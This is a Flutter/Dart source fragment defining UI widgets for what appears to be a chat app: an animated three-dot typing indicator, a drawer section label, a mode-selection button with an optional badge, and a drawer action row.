class _TypingDotsState extends State<_TypingDots> with TickerProviderStateMixin {
  late List<AnimationController> _ctrls;
  
  @override
  void initState() {
    super.initState();
    _ctrls = List.generate(3, (i) => AnimationController(vsync: this, duration: Duration(milliseconds: 500))..repeat(reverse: true));
  }
  
  @override
  void dispose() {
    for (final c in _ctrls) c.dispose();
    super.dispose();
  }
  
  @override
  Widget build(BuildContext context) {
    return Row(mainAxisSize: MainAxisSize.min,
      children: List.generate(3, (i) => Padding(padding: const EdgeInsets.symmetric(horizontal: 3),
        child: AnimatedBuilder(animation: _ctrls[i], builder: (_, __) => Container(width: 7, height: 7, decoration: BoxDecoration(shape: BoxShape.circle, color: const Color(0xFFE53935).withOpacity(0.5 + _ctrls[i].value * 0.5))))),
      ),
    );
  }
}

class _DrawerSectionLabel extends StatelessWidget {
  final String label;
  const _DrawerSectionLabel(this.label);
  @override
  Widget build(BuildContext context) => Padding(padding: const EdgeInsets.symmetric(horizontal: 14), child: Text(label, style: GoogleFonts.outfit(fontSize: 10, fontWeight: FontWeight.w700, letterSpacing: 1.5, color: Colors.white30)));
}

class _ModeButton extends StatelessWidget {
  final String icon, label; final String? badge; final bool active; final VoidCallback onTap;
  const _ModeButton({required this.icon, required this.label, this.badge, required this.active, required this.onTap});
  
  @override
  Widget build(BuildContext context) => GestureDetector(
    onTap: onTap,
    child: Padding(padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 4),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 11),
        decoration: BoxDecoration(color: active ? const Color(0xFFE53935).withOpacity(0.15) : Colors.transparent, borderRadius: BorderRadius.circular(12)),
        child: Row(children: [
          Container(width: 30, height: 30, decoration: BoxDecoration(borderRadius: BorderRadius.circular(8), color: active ? const Color(0xFFE53935).withOpacity(0.2) : Colors.white.withOpacity(0.06)), child: Center(child: Text(icon, style: TextStyle(fontSize: 14)))),
          const SizedBox(width: 10),
          Expanded(child: Text(label, style: GoogleFonts.outfit(fontSize: 14, fontWeight: FontWeight.w600, color: active ? Colors.white : Colors.white60))),
          if (badge != null) Container(padding: EdgeInsets.symmetric(horizontal: 7, vertical: 2), decoration: BoxDecoration(color: Color(0xFFE53935), borderRadius: BorderRadius.circular(99)), child: Text(badge!, style: GoogleFonts.outfit(fontSize: 10, fontWeight: FontWeight.w700, color: Colors.white))),
        ]),
      ),
    ),
  );
}

class _DrawerAction extends StatelessWidget {
  final IconData icon; final String label; final VoidCallback onTap;
  const _DrawerAction({required this.icon, required this.label, required this.onTap});
  
  @override
  Widget build(BuildContext context) => GestureDetector(
    onTap: onTap,
    child: Padding(padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 4),
      child: Container(padding: EdgeInsets.symmetric(horizontal: 12, vertical: 11), decoration: BoxDecoration(borderRadius: BorderRadius.circular(12)),
        child: Row(children: [
          Container(width: 30, height: 30, decoration: BoxDecoration(borderRadius: BorderRadius.circular(8), color: Colors.white.withOpacity(0.06)), child: Center(child: Icon(icon, size: 16, color: Colors.white60))),
          const SizedBox(width: 10),
          Text(label, style: GoogleFonts.outfit(fontSize: 14, fontWeight: FontWeight.w500, color: Colors.white60)),
        ]),
      ),
    ),
  );
}